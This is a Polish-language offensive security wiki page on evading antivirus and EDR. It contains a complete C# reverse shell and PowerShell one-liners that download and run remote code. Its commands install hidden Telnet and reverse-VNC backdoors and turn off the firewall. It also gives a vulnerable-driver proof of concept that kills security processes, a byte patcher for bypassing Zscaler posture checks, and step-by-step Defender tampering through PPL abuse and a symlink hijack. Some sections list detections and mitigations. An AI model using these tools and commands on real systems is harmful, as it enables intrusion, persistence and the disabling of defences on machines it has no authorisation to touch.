Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) już umożliwia wykonywanie C# assemblies bezpośrednio w pamięci, ale istnieją różne sposoby ich użycia:

- **Fork\&Run**

Polega na **uruchomieniu nowego procesu ofiary (sacrificial process)**, wstrzyknięciu do niego Twojego post-exploitation złośliwego kodu, wykonaniu go, a po zakończeniu zabiciu tego procesu. Ma to swoje zalety i wady. Zaletą metody fork and run jest to, że wykonywanie odbywa się **poza** naszym procesem implantacyjnym Beacon. Oznacza to, że jeśli coś pójdzie nie tak w naszej akcji post-exploitation lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa.** Wadą jest to, że mamy **większe ryzyko** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Chodzi o wstrzyknięcie post-exploitation złośliwego kodu **do własnego procesu**. W ten sposób można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak z wykonaniem payloadu, istnieje **znacznie większe ryzyko** **utraty Twojego beacon** gdyż proces może się zawiesić/wyjść.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz przeczytać więcej o ładowaniu C# Assembly, sprawdź ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować C# Assemblies **z PowerShell**, sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu w innych językach poprzez udostępnienie skompromitowanej maszynie dostępu **do środowiska interpretera zainstalowanego na współdzielonym udziale SMB kontrolowanym przez atakującego**.

Pozwalając na dostęp do Interpreter Binaries i środowiska na udziale SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.

Repo wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itd. mamy **więcej elastyczności w omijaniu statycznych sygnatur**. Testy z losowymi, nieobfuskowanymi reverse shell skryptami w tych językach okazały się skuteczne.

## TokenStomping

Token stomping to technika, która pozwala atakującemu **manipulować tokenem dostępu lub produktem bezpieczeństwa takim jak EDR lub AV**, umożliwiając obniżenie jego uprawnień tak, że proces nie zginie, ale nie będzie miał uprawnień do sprawdzania złośliwej aktywności.

Aby temu zapobiec, Windows mógłby **zabronić zewnętrznym procesom** uzyskiwania uchwytów do tokenów procesów zabezpieczeń.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest zainstalować Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia i utrzymania dostępu:
1. Pobierz ze strony https://remotedesktop.google.com/, kliknij "Set up via SSH", następnie kliknij plik MSI dla Windows, aby pobrać instalator MSI.
2. Uruchom instalator cicho na maszynie ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć do strony Chrome Remote Desktop i kliknij dalej. Kreator poprosi o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr z drobnymi modyfikacjami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Zwróć uwagę na parametr pin, który pozwala ustawić PIN bez użycia GUI).

## Advanced Evasion

Evasion to bardzo złożony temat, czasami trzeba brać pod uwagę wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, przeciw któremu działasz, będzie miało swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby zapoznać się z bardziej zaawansowanymi technikami Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To jest także świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który będzie **usuwal części binarki** aż **wykryje, którą część Defender** uznaje za złośliwą i wskaże ją.\
Inne narzędzie robiące to samo to [**avred**](https://github.com/dobin/avred) z otwartą usługą webową dostępną pod [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10 wszystkie wersje Windows zawierały **serwer Telnet**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ustaw, aby **uruchamiał się** przy starcie systemu i **uruchom go** teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz stąd: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz binarne wersje, nie setup)

**ON THE HOST**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś binarkę _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

The **attacker** powinien **uruchomić wewnątrz** swojego **host** binarkę `vncviewer.exe -listen 5900`, aby była **przygotowana** do przechwycenia reverse **VNC connection**. Następnie, wewnątrz **victim**: uruchom demona winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Aby zachować stealth musisz unikać kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywoła to [popup](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [the config window](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, bo wywoła to [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz stąd: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom listera** za pomocą `msfconsole -r file.rc` i **wykonaj** **xml payload** poleceniem:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Aktualny Defender zakończy proces bardzo szybko.**

### Kompilowanie naszego własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# użycie kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i wykonanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia python do build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Wyłączanie AV/EDR z poziomu przestrzeni jądra

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć zabezpieczenia punktów końcowych przed wdrożeniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji w jądrze, których nawet usługi AV działające jako Protected-Process-Light (PPL) nie mogą zablokować.

Kluczowe wnioski
1. **Podpisany sterownik**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binarka to prawidłowo podpisany sterownik `AToolsKrnl64.sys` z "System In-Depth Analysis Toolkit" Antiy Labs. Ponieważ sterownik posiada ważny podpis Microsoft, ładuje się nawet gdy Driver-Signature-Enforcement (DSE) jest włączone.
2. **Instalacja usługi**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako **usługę jądra**, a druga uruchamia go, dzięki czemu `\\.\ServiceMouse` staje się dostępne z przestrzeni użytkownika.
3. **IOCTL-y udostępnione przez sterownik**
| IOCTL code | Funkcja                              |
|-----------:|--------------------------------------|
| `0x99000050` | Zakończyć dowolny proces po PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usunąć dowolny plik z dysku |
| `0x990001D0` | Wyładować sterownik i usunąć usługę |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia w trybie użytkownika; kod wykonywany w jądrze może otwierać *chronione* procesy, kończyć je lub manipulować obiektami jądra niezależnie od PPL/PP, ELAM czy innych mechanizmów hardeningu.

Wykrywanie / Łagodzenie
•  Włącz listę blokowanych podatnych sterowników Microsoft (`HVCI`, `Smart App Control`), aby Windows odrzucał ładowanie `AToolsKrnl64.sys`.  
•  Monitoruj tworzenie nowych *usług jądra* i generuj alert, gdy sterownik jest ładowany z katalogu zapisywalnego przez wszystkich lub nie znajduje się na liście dozwolonych.  
•  Obserwuj uchwyty w trybie użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie sprawdzeń postawy Zscaler Client Connector przez patchowanie binarek na dysku

Zscaler’s **Client Connector** stosuje zasady postawy urządzenia lokalnie i polega na Windows RPC, aby przekazać wyniki innym komponentom. Dwa słabe rozwiązania projektowe umożliwiają pełne obejście:

1. Ocena postawy odbywa się **całkowicie po stronie klienta** (na serwer wysyłana jest wartość logiczna).  
2. Wewnętrzne endpointy RPC weryfikują tylko, że łączący się plik wykonywalny jest **podpisany przez Zscaler** (przez `WinVerifyTrust`).

Poprzez patchowanie czterech podpisanych binarek na dysku oba mechanizmy można zneutralizować:

| Binary | Original logic patched | Result |
|--------|------------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola jest zgodna |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ każdy (nawet niepodpisany) proces może połączyć się z pipe'ami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Pominięte |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** posture checks pokazują **zielone/zgodne**.
* Niesygnowane lub zmodyfikowane binaria mogą otwierać named-pipe RPC endpoints (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Skompromitowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

To studium przypadku pokazuje, jak czysto klienckie decyzje zaufania i proste sprawdzenia podpisów można obejść kilkoma poprawkami na poziomie bajtów.

## Wykorzystywanie Protected Process Light (PPL) do manipulowania AV/EDR przy użyciu LOLBINs

Protected Process Light (PPL) wymusza hierarchię podpisujący/poziom, dzięki czemu tylko procesy chronione o równym lub wyższym poziomie mogą się wzajemnie modyfikować. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić binarium z włączonym PPL i kontrolować jego argumenty, możesz zamienić nieszkodliwą funkcjonalność (np. logowanie) w ograniczony prymityw zapisu wspierany przez PPL przeciw chronionym katalogom używanym przez AV/EDR.

Co sprawia, że proces działa jako PPL
- Docelowy EXE (i załadowane DLL) musi być podpisany z EKU obsługującym PPL.
- Proces musi być utworzony za pomocą CreateProcess używając flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać kompatybilnego poziomu ochrony dopasowanego do podpisującego binarium (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla podpisujących anti-malware, `PROTECTION_LEVEL_WINDOWS` dla podpisujących Windows). Nieprawidłowe poziomy spowodują błąd przy tworzeniu.

Zobacz także szersze wprowadzenie do PP/PPL i ochrony LSASS tutaj:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia uruchamiające
- Narzędzie open-source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Prymityw LOLBIN: ClipUp.exe
- Podpisany binarny plik systemowy `C:\Windows\System32\ClipUp.exe` samodzielnie się uruchamia i akceptuje parametr do zapisania pliku logu w ścieżce podanej przez wywołującego.
- Gdy uruchomiony jako proces PPL, zapis pliku odbywa się z ochroną PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać do normalnie chronionych lokalizacji.

8.3 short path helpers
- Wyświetlanie krótkich nazw: `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z użyciem `CREATE_PROTECTED_PROCESS` przy pomocy launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). Użyj krótkich nazw 8.3 jeśli potrzeba.
3) Jeżeli docelowy binarny plik jest zazwyczaj otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis przy rozruchu przed uruchomieniem AV, instalując usługę autostartu, która uruchamia się wcześniej. Zweryfikuj kolejność rozruchu za pomocą Process Monitor (boot logging).
4) Po restarcie zapis z obsługą PPL następuje przed zablokowaniem binariów przez AV, uszkadzając docelowy plik i uniemożliwiając uruchomienie.

Przykładowe wywołanie (ścieżki wyredagowane/skrócone dla bezpieczeństwa):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie możesz kontrolować zawartości, które zapisuje ClipUp poza miejscem zapisu; prymityw nadaje się do korumpowania, a nie precyzyjnego wstrzykiwania treści.
- Wymaga lokalnego administratora/SYSTEM do zainstalowania/uruchomienia usługi oraz możliwości restartu.
- Czas jest krytyczny: cel nie może być otwarty; wykonanie w czasie rozruchu unika blokad plików.

Wykrywanie
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie gdy rodzicem jest niestandardowy launcher, w okolicach rozruchu.
- Nowe usługi skonfigurowane do autostartu podejrzanych binarek i konsekwentnie uruchamiające się przed Defender/AV. Zbadaj tworzenie/modyfikację usług przed błędami uruchamiania Defendera.
- Monitorowanie integralności plików w katalogach binarek Defender/Platform; nieoczekiwane tworzenie/modyfikacje plików przez procesy z flagami protected-process.
- ETW/EDR telemetry: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomów PPL przez binarki nie będące AV.

Mitigacje
- WDAC/Code Integrity: ogranicz, które podpisane binarki mogą działać jako PPL i pod jakimi rodzicami; blokuj wywołania ClipUp poza legalnymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług autostartu i monitoruj manipulacje kolejnością uruchamiania.
- Upewnij się, że Defender tamper protection i early-launch protections są włączone; zbadaj błędy startu wskazujące na korupcję binarek.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach hostujących narzędzia zabezpieczające, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

Referencje dla PPL i narzędzi
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulacja Microsoft Defender przez Symlink Hijack folderu wersji Platform

Windows Defender wybiera platformę, z której działa, enumerując podfoldery w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia stamtąd procesy usługi Defendera (aktualizując ścieżki usług/rejestru odpowiednio). Ten wybór ufa wpisom katalogu, włączając w to punkty reparse (symlinki). Administrator może to wykorzystać, przekierowując Defender na ścieżkę zapisywalną przez atakującego, co umożliwia DLL sideloading lub zakłócenie usługi.

Warunki wstępne
- Lokalny Administrator (wymagany do tworzenia katalogów/symlinków w folderze Platform)
- Możliwość restartu lub wywołania ponownego wyboru platformy Defender (restart usługi przy rozruchu)
- Wymagane tylko wbudowane narzędzia (mklink)

Dlaczego to działa
- Defender blokuje zapisy w swoich własnych katalogach, ale jego wybór platformy ufa wpisom katalogu i wybiera leksykograficznie najwyższą wersję bez weryfikacji, że cel rozwiązuje się do chronionej/zaufanej ścieżki.

Krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz w katalogu Platform symlink do katalogu o wyższej wersji wskazujący na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecane ponowne uruchomienie):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, że MsMpEng.exe (WinDefend) uruchamia się z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinieneś zaobserwować nową ścieżkę procesu pod `C:\TMP\AV\` oraz konfigurację usługi/rejestru odzwierciedlającą tę lokalizację.

Opcje post-exploitacji
- DLL sideloading/code execution: Podrzuć/zamień DLL, które Defender ładuje ze swojego katalogu aplikacji, aby wykonać kod w procesach Defendera. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, żeby przy następnym uruchomieniu skonfigurowana ścieżka nie została rozwiązana i Defender nie mógł się uruchomić:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Zauważ, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga uprawnień administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły Red mogą przenieść runtime evasion z implantów C2 do samego modułu docelowego poprzez podczepienie jego Import Address Table (IAT) i przekierowanie wybranych API przez kontrolowany przez atakującego, position‑independent code (PIC). To uogólnia evasion poza wąski zbiór API, który eksponuje wiele kitów (np. CreateProcessA), i rozszerza te same zabezpieczenia na BOFs oraz post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Zastosuj patch po relocations/ASLR i przed pierwszym użyciem importu. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Zachowaj wrappery małe i zgodne z PIC; rozwiąż prawdziwe API przez oryginalną wartość IAT, którą przechwyciłeś przed patchowaniem lub przez LdrGetProcedureAddress.
- Używaj przejść RW → RX dla PIC i unikaj pozostawiania writable+executable pages.

Stub podszywający się pod stos wywołań
- Draugr‑style PIC stubs budują fałszywy łańcuch wywołań (adresy powrotu wskazujące na benign modules) i następnie przechodzą do rzeczywistego API.
- To omija wykrycia, które oczekują kanonicznych stosów z Beacon/BOFs do sensitive APIs.
- Łączyć z technikami stack cutting/stack stitching, aby znaleźć się wewnątrz oczekiwanych ramek przed prologiem API.

Integracja operacyjna
- Prepend the reflective loader to post‑ex DLLs tak, aby PIC i hooki inicjalizowały się automatycznie przy załadowaniu DLL.
- Użyj Aggressor script do zarejestrowania docelowych API, dzięki czemu Beacon i BOFs transparentnie skorzystają z tej samej ścieżki unikania bez zmian w kodzie.

Rozważania dotyczące wykrywania/DFIR
- IAT integrity: wpisy, które rozwiązują się do non‑image (heap/anon) adresów; okresowa weryfikacja wskaźników importu.
